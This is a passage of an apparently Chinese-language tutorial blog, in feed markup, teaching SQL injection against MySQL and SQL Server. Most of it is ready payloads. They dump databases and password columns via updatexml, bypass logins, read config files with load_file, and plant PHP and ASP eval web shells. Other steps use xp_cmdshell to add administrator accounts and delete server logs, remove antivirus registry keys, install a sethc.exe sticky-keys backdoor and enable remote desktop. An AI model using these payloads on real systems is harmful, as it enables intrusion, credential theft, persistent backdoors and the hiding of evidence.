#查看当前数据库用户</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+                                                    #查看当前数据库名</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+     #查看当前数据库</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)--+         #查看当前数据库</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e),1)--+       #查看当前数据库</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)--+     #查看所有数据库</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;mysql&#x27;),0x7e),1)--+ </span><br><span class="line">可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么，这样就达到了目的。</span><br><span class="line">有一点需要注意，updatexml()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</span><br><span class="line">这里查询前5位示意:</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,substring(hex((select database())),1,5),0x7e),1)</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,substring(hex((select group_concat(schema_name) from information_schema.schemata)),1,5),0x7e),1)--+ </span><br><span class="line"></span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;mysql&#x27; limit 0,1),0x7e),1)--+            #查看当前数据库的表名</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;user&#x27; limit 0,1),0x7e),1)--+            #查看user表的列名</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27; limit 0,1),0x7e),1)--+   列用户名密码</span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select user from user limit 0,1),0x7e),1)--+ </span><br><span class="line">&#x27;and updatexml(1,concat(0x7e,(select password from user limit 0,1),0x7e),1)--+ </span><br><span class="line"></span><br><span class="line">%27and%20updatexml(1,concat(0x7e,substring(hex((select%20password%20from%20user%20limit%200,1)),44,75),0x7e),1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后台绕过"><a href="#后台绕过" class="headerlink" title="后台绕过"></a>后台绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&#x27;&#x27; and password=&#x27;&#x27;</span><br><span class="line">输入：admin&#x27;#</span><br><span class="line">select * from user where username=&#x27;admin&#x27;#&#x27; and password=&#x27;&#x27;</span><br><span class="line">输入：admin&#x27; or &#x27;1=1</span><br><span class="line">select * from user where username=&#x27;admin&#x27; or &#x27;1=1&#x27; and password=&#x27;&#x27;</span><br></pre></td></tr></table></figure><h1 id="Mysql长字节截断攻击"><a href="#Mysql长字节截断攻击" class="headerlink" title="Mysql长字节截断攻击"></a>Mysql长字节截断攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">管理员和普通用户在一个表中</span><br><span class="line">用户名字段长度有一定限制比如长度为10个字符</span><br><span class="line">普通用户在注册名称的时候可以吧用户名设置为</span><br><span class="line">Admin+++++++++++++++++++++++++</span><br><span class="line">使其长度超过字段限制的长度，会自动截断，变成admin</span><br><span class="line">这样相当于增加了个admin管理员账号密码。</span><br></pre></td></tr></table></figure><h1 id="Mysql宽字节注入"><a href="#Mysql宽字节注入" class="headerlink" title="Mysql宽字节注入"></a>Mysql宽字节注入</h1><p>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。<br>这和 addslashes() 作用完全相同。<br>一共有三个魔术引号指令：<br>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。<br>不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。<br>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，<br>包括从数据库和文本文件，所返回的数据都会被反斜线转义。<br>该选项可在运行的时改变，在 PHP 中的默认值为 off。<br>参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。<br>magic_quotes_sybase 如果打开的话，将会使用单引号对单引号进行转义而非反斜线。<br>此选项会完全覆盖 magic_quotes_gpc。<br>如果同时打开两个选项的话，单引号将会被转义成 ‘’。而双引号、反斜线 和 NULL 字符将不会进行转义。<br>如何取得其值参见 ini_get()。</p><p>使用宽字节注入绕过魔术引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%df%27</span><br><span class="line">sqlmap.py -u “cracer.com/xx.php?id=1”</span><br><span class="line">--risk 3 --dbms=mysql -p username --tamper unmagicquotes.py -v 3</span><br></pre></td></tr></table></figure><h1 id="Mysql-读写文件操作"><a href="#Mysql-读写文件操作" class="headerlink" title="Mysql  读写文件操作"></a>Mysql  读写文件操作</h1><p>load_file()函数<br>该函数是用来读取源文件的函数<br>只能读取绝对路径的网页文件<br>在使用load_file()时应先找到网站绝对路径<br>例如：<br>d:&#x2F;www&#x2F;xx&#x2F;index.php<br>&#x2F;usr&#x2F;src&#x2F;apache&#x2F;htdoc&#x2F;index.php<br>注意：<br>1.路径符号 “&quot; 错误“\”正确 “&#x2F;” 正确<br>2.转换十六进制数，就不要‘’ </p><h2 id="获取根目录"><a href="#获取根目录" class="headerlink" title="获取根目录"></a>获取根目录</h2><p>1.报错显示<br>2.谷歌黑客<br>site:目标网站 warning<br>3.遗留文件 phpinfo info test php<br>4.漏洞爆路径<br>5.读取配置文件</p><h2 id="读取网站文件内容"><a href="#读取网站文件内容" class="headerlink" title="读取网站文件内容"></a>读取网站文件内容</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&#x27;C:\\Inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&#x27;),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(0x443A5C7068705C41504D53657276352E322E365C7777775C6874646F63735C335C636F6E6669672E706870),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/windows/system32/inetsrv/metabase.xml</span><br></pre></td></tr></table></figure><h2 id="写入函数-into-outfile"><a href="#写入函数-into-outfile" class="headerlink" title="写入函数 into outfile"></a>写入函数 into outfile</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,&quot;&lt;?php @eval($_POST[&#x27;cracer&#x27;]);?&gt;&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile &#x27;C:/Inetpub/wwwroot/mysql-sql/cracer.txt&#x27;</span><br></pre></td></tr></table></figure><p>其他利用<br>第一种方法：需要使用wamp环境搭建需要系统权限才能执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,&quot;net user seven 123 /add&quot;,2,3,4,5,6 into outfile &#x27;C://Documents and Settings/Administrator/「开始」菜单/程序/启动/1.bat&#x27;</span><br></pre></td></tr></table></figure><p>第二种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,&quot;&lt;pre&gt;&lt;body&gt;&lt;?  @system($_GET[&#x27;cc&#x27;]); ?&gt;&lt;/body&gt;&lt;/pre&gt;&quot;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile &#x27;C:/Inetpub/wwwroot/mysql-sql/cr.php&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入- Sqlserver</title>
      <link href="/archives/e1f1921e.html"/>
      <url>/archives/e1f1921e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Sqlserver-介绍"><a href="#Sqlserver-介绍" class="headerlink" title="Sqlserver 介绍"></a>Sqlserver 介绍</h1><p>美国Microsoft公司推出的一种关系型数据库系统。SQLServer是一个可扩展的、高性能的、为分布式客户机&#x2F;服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。<br>其主要特点如下：<br>（1）高性能设计，可充分利用WindowsNT的优势<br>（2）系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。<br>（3）强壮的事务处理功能，采用各种方法保证数据的完整性。<br>（4）支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。 SQLServer以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。</p><h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><ol><li>说明：创建数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE database-name </span><br></pre></td></tr></table></figure></li><li>说明：删除数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database dbname</span><br></pre></td></tr></table></figure></li><li>查询所有：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Select * from 表名</span><br><span class="line">select * from Student</span><br></pre></td></tr></table></figure></li></ol><h1 id="mssql数据库权限"><a href="#mssql数据库权限" class="headerlink" title="mssql数据库权限"></a>mssql数据库权限</h1><ul><li>sa权限：数据库操作，文件管理，命令执行，注册表读取等 system</li><li>db权限：文件管理,数据库操作等 users-adminstrators</li><li>public权限：数据库操作 guest-users</li></ul><h1 id="调用数据库代码"><a href="#调用数据库代码" class="headerlink" title="调用数据库代码"></a>调用数据库代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"> set conn =server.createobject(&quot;adodb.connection&quot;) </span><br><span class="line"> conn.open  </span><br><span class="line"> &quot;provider=sqloledb;source=local;uid=sa;pwd=123123;database=database-name&quot;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>其中，provider后面的不用管，照写；source后面的可以是ip地址，这里我用的是本地的；sa是内置的<br>用户，它的密码是你在安装的时候设置的；database后面是你要连接的数据库的名称，例：mydatabase<br>(不需扩展名）。</p><h1 id="SqlServer注入利用"><a href="#SqlServer注入利用" class="headerlink" title="SqlServer注入利用"></a>SqlServer注入利用</h1><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul><li>漏洞出现的位置</li><li>手工挖掘：</li><li>有参数传递<br>   有数据库交互<br>   我们可以控制</li><li>工具扫描<br>  Awvs、burp、appscan<h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2></li></ul><ol><li>判断是否有注入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 </span><br><span class="line">and 1=2 </span><br><span class="line">/</span><br><span class="line">-0</span><br></pre></td></tr></table></figure>判断注入的方法是一样的</li><li>初步判断是否是mssql <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and user&gt;0 </span><br></pre></td></tr></table></figure></li><li>判断数据库系统 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from sysobjects)&gt;0 mssql </span><br><span class="line">and (select count(*) from msysobjects)&gt;0 access </span><br></pre></td></tr></table></figure></li><li>注入参数是字符 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and [查询条件] and &#x27;&#x27;=&#x27; </span><br></pre></td></tr></table></figure></li><li>搜索时没过滤参数的 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and [查询条件] and &#x27;%25&#x27;=&#x27; </span><br></pre></td></tr></table></figure></li><li>猜数表名 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select Count(*) from [表名])&gt;0 </span><br></pre></td></tr></table></figure></li><li>猜字段 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select Count(字段名) from 表名)&gt;0 </span><br></pre></td></tr></table></figure></li><li>猜字段中记录长度 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 len(字段名) from 表名)&gt;0 </span><br></pre></td></tr></table></figure></li><li>(1)猜字段的ascii值（access） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 </span><br></pre></td></tr></table></figure>  (2)猜字段的ascii值（mssql） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0 </span><br></pre></td></tr></table></figure></li></ol><h2 id="union-联合查询"><a href="#union-联合查询" class="headerlink" title="union 联合查询"></a>union 联合查询</h2><p>顺便查下版本和数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,@@version,db_name(),null,null</span><br></pre></td></tr></table></figure><p>如果要查其他数据库的表名还可以这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select  null,(select top 1 name from [dbname]..sysobjects where xtype=&#x27;u&#x27; and name not in(select top 0 name from [dbname]..sysobjects where xtype=&#x27;u&#x27;)),null,null</span><br></pre></td></tr></table></figure><h2 id="union-列表名"><a href="#union-列表名" class="headerlink" title="union 列表名"></a>union 列表名</h2><ul><li>继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)</li><li>第一个表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;) and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;))),null</span><br></pre></td></tr></table></figure></li><li>第二个表名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;) and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;))),null</span><br></pre></td></tr></table></figure></li></ul><h2 id="union-列列名"><a href="#union-列列名" class="headerlink" title="union 列列名"></a>union 列列名</h2><ul><li>继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)</li><li>第一个列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;) and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;))),null</span><br></pre></td></tr></table></figure></li><li>第二个列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;) and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;))),null</span><br></pre></td></tr></table></figure></li><li>第三个列名<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;) and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name=&#x27;password&#x27;))),null</span><br></pre></td></tr></table></figure></li></ul><h2 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.240:8005/?id=1   union select null,username,password  from password where username not in (select top 0 username from password)</span><br></pre></td></tr></table></figure><h1 id="SqlServer不同权限利用"><a href="#SqlServer不同权限利用" class="headerlink" title="SqlServer不同权限利用"></a>SqlServer不同权限利用</h1><ul><li>用户所处权限分析：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sa权限</span><br><span class="line">dbo</span><br><span class="line">public</span><br></pre></td></tr></table></figure><h2 id="权限判断语句"><a href="#权限判断语句" class="headerlink" title="权限判断语句"></a>权限判断语句</h2></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;)) //判断是否是系统管理员 </span><br><span class="line">and 1=(select is_srvrolemember(&#x27;db_owner&#x27;)) //判断是否是库权限 </span><br><span class="line">and 1=(select is_srvrolemember(&#x27;public&#x27;))   //判断是否为public权限</span><br><span class="line">and 1=convert(int,db_name())或1=(select db_name())  //当前数据库名 </span><br><span class="line">and 1=(select @@servername)  //本地服务名 </span><br><span class="line">and 1=(select HAS_DBACCESS(&#x27;master&#x27;))  //判断是否有库读取权限</span><br></pre></td></tr></table></figure><h2 id="Sa权限的利用"><a href="#Sa权限的利用" class="headerlink" title="Sa权限的利用"></a>Sa权限的利用</h2><ul><li>注入用户密码</li><li>修改网站管理员密码</li><li>直接getshell</li><li>调用系统命令<blockquote><p>创建系统管理员<br>操控文件<br>操控日志文件<br>getshell</p></blockquote></li><li>创建sqlserver管理</li><li>系统服务操作</li><li>注册表操作<blockquote><p>创建后门<br>开启3389</p></blockquote></li></ul><h2 id="SQLserver中的存储过程"><a href="#SQLserver中的存储过程" class="headerlink" title="SQLserver中的存储过程"></a>SQLserver中的存储过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sp_addlogin  创建新的SQL server登录，该登录运行用户使用SQL server身份验证连接到SQL server实例</span><br><span class="line"></span><br><span class="line">sp_dropuser  从当前数据库中删除数据库用户</span><br><span class="line"></span><br><span class="line">xp_enumgroups提供Microsoft Windows本地组列表或在指定的Windows域中定义的全局组列表</span><br><span class="line"></span><br><span class="line">xp_regwrite未被公布的存储过程,，写入注册表</span><br><span class="line"></span><br><span class="line">xp_regread读取注册表</span><br><span class="line"></span><br><span class="line">xp_regdeletevalue删除注册表</span><br><span class="line"></span><br><span class="line">xp_dirtree读取目录</span><br><span class="line"></span><br><span class="line">sp_password更改密码</span><br><span class="line"></span><br><span class="line">xp_servicecontrol停止或激活某服务</span><br></pre></td></tr></table></figure><h2 id="修改网站管理员密码"><a href="#修改网站管理员密码" class="headerlink" title="修改网站管理员密码"></a>修改网站管理员密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;update admin set pass=‘e8dc763194f29433’ where admin=‘test’</span><br></pre></td></tr></table></figure><p>将管理员表admin中admin用户的密码设置为e8dc763194f29433</p><p>修改之前把原来密码备份<br>通常在密码解不出的情况下选择使用该方法</p><h2 id="直接getshell"><a href="#直接getshell" class="headerlink" title="直接getshell"></a>直接getshell</h2><p>修复上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;,1; </span><br><span class="line">RECONFIGURE;</span><br><span class="line">;exec sp_configure &#x27;Web Assistant Procedures&#x27;, 1; </span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27C:\Inetpub\wwwroot\8005\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--</span><br></pre></td></tr></table></figure><h2 id="调用系统命令xp-cmdshell"><a href="#调用系统命令xp-cmdshell" class="headerlink" title="调用系统命令xp_cmdshell"></a>调用系统命令xp_cmdshell</h2><h2 id="检测与恢复扩展存储"><a href="#检测与恢复扩展存储" class="headerlink" title="检测与恢复扩展存储"></a>检测与恢复扩展存储</h2><p>判断xp_cmdshell扩展存储是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; AND name= &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure><p>判断xp_regread扩展存储过程是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select count(*) from master.dbo.sysobjects where name=&#x27;xp_regread&#x27;)</span><br></pre></td></tr></table></figure><p>恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec sp_dropextendedproc xp_cmdshell,&#x27;xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><h2 id="Xp-cmdshell执行命令"><a href="#Xp-cmdshell执行命令" class="headerlink" title="Xp_cmdshell执行命令"></a>Xp_cmdshell执行命令</h2><p>新建用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &#x27;net user test test /add&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &#x27;net localgroup administrators test /add&#x27;</span><br></pre></td></tr></table></figure><p>操控日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master.dbo.xp_cmdshell &#x27;del c:\winnt\system32\logfiles\w3svc5\ex070606.log &#x27;</span><br></pre></td></tr></table></figure><p>Getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;%Execute(request(&quot;a&quot;))%^&gt; &gt; d:\www\123.asp</span><br><span class="line">;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\233.aspx&#x27; ;--</span><br></pre></td></tr></table></figure><p>操作注册表<br>删除注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg delete HKLM\SOFTWARE\McAfee /f</span><br></pre></td></tr></table></figure><p>导入注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Regedit /s d:\web\zh\hp.reg</span><br></pre></td></tr></table></figure><p>导出注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit /e d:\web\zhao\aaa.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp&quot;</span><br></pre></td></tr></table></figure><h2 id="创建sqlserver管理"><a href="#创建sqlserver管理" class="headerlink" title="创建sqlserver管理"></a>创建sqlserver管理</h2><ul><li>添加和删除一个SA权限的用户test：（需要SA权限）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_addlogin test,password</span><br><span class="line">exec master.dbo.sp_addsrvrolemember test,sysadmin</span><br></pre></td></tr></table></figure><h2 id="系统服务操作"><a href="#系统服务操作" class="headerlink" title="系统服务操作"></a>系统服务操作</h2></li><li>停掉或激活某个服务。 （需要SA权限）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_servicecontrol &#x27;stop&#x27;,&#x27;schedule&#x27;</span><br><span class="line">exec master..xp_servicecontrol &#x27;start&#x27;,&#x27;schedule&#x27;</span><br></pre></td></tr></table></figure></li></ul><h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><ul><li><p>启用存储过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_regread,&#x27;xpstar.dll&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master.dbo.sp_addextendedproc0x780070005f007200650067007200650061006400,0x7800700073007400610072002e0064006c006c00—</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_regwrite,&#x27;xpstar.dll&#x27; </span><br></pre></td></tr></table></figure><h2 id="写入注册表"><a href="#写入注册表" class="headerlink" title="写入注册表"></a>写入注册表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;debugger&#x27;,&#x27;REG_SZ&#x27;,&#x27;c:\windows\system32\cmd.exe&#x27; </span><br><span class="line"></span><br><span class="line">xp_regwrite 根键,子键, 值名, 值类型, 值</span><br></pre></td></tr></table></figure></li><li><p>写入shift后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regwrite </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,&#x27;c:\\windows\\system32\\taskmgr.exe&#x27;--</span><br></pre></td></tr></table></figure><h2 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &#x27;sc config termservice start=auto&#x27; </span><br><span 